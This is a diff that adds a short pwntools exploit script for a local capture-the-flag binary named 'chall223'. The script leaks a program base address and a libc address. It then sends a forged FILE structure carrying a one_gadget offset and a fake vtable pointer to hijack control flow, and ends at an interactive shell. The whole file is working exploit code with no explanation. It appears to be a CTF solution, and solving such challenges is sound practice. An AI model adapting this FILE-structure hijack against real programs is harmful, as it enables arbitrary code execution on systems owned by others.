@@ -1,0 +1,32 @@
+#coding:utf-8
+from pwn import *
+r=process('./chall223')
+context(os='linux',arch='amd64',log_level='debug')
+context.terminal = ['terminator','-x','sh','-c']
+r.recvuntil("What's your name?")
+r.sendline('aaa')
+r.recvuntil('>>>')
+r.sendline('1')
+r.recvuntil('Size of task:')
+r.sendline(str(0x300))
+r.recvuntil('Task:\n')
+pay='\x5b\0\x07'+'\x00'*0x58+'\x14\x01'*6+'\x00'*6+'\x00'*0x10+'\x14\x01'*6+'\x08'
+r.sendline(pay)
+data = r.recvuntil('>>')
+pb = u64(data[:6]+'\0\0')
+libc = u64(data[6:12]+'\0\0')
+
+r.sendline('1')
+r.recvuntil('Size of task:')
+r.sendline(str(0x300))
+r.recvuntil('Task:\n')
+r.send('\x5b\0\x07'+'\x00'*0x20+'\x15\x01'*0x100+'\x03')
+tmp = p64(pb + 0x58)
+tmp = tmp.ljust(0x20, '\0')
+tmp += p64(0xfbadffff)  
+tmp += p64(libc-0x3a2d0+0xf1147)
+tmp = tmp.ljust(0xd8+0x20,'\0')
+tmp += p64(pb+0x58+8-0x88)
+sleep(0.5)
+r.send(tmp)
+r.interactive()
